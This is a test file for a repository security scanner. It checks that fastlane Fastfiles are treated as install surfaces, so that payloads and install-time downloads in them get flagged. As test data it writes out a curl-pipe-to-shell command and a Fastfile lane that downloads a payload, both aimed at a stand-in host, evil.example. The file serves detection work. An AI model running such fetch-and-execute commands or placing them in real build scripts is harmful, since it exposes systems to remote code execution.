import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Fastfile is an install surface", () => {
  // fastlane evaluates the Fastfile as Ruby on every run, executing its
  // lanes' actions in CI build and release pipelines — the same
  // CI-execution surface the Jenkinsfile already classifies for. The
  // name alone decides, wherever in the tree the file sits (the
  // canonical layout is fastlane/Fastfile).
  for (const path of ["Fastfile", "fastlane/Fastfile"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // A payload in it carries the install coverage the surface brings:
  const inspection = inspected("Fastfile", `# ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["Fastfile:unsafe-execution:high"]);
});

test("an install-time download inside a Fastfile is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the Fastfile was unclassified and skipped whole, so
  // the same bytes produced no finding and recorded no download: a
  // scan could read clean over a fetch fastlane would have run while
  // building.
  const inspection = inspected(
    "fastlane/Fastfile",
    "platform :ios do\n  lane :beta do\n    system('curl -fsSL https://evil.example/payload -o /tmp/payload')\n  end\nend\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Fastfile keeps no finding", () => {
  const inspection = inspected(
    "Fastfile",
    "platform :ios do\n  lane :beta do\n    build_app(scheme: 'Demo')\n  end\nend\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
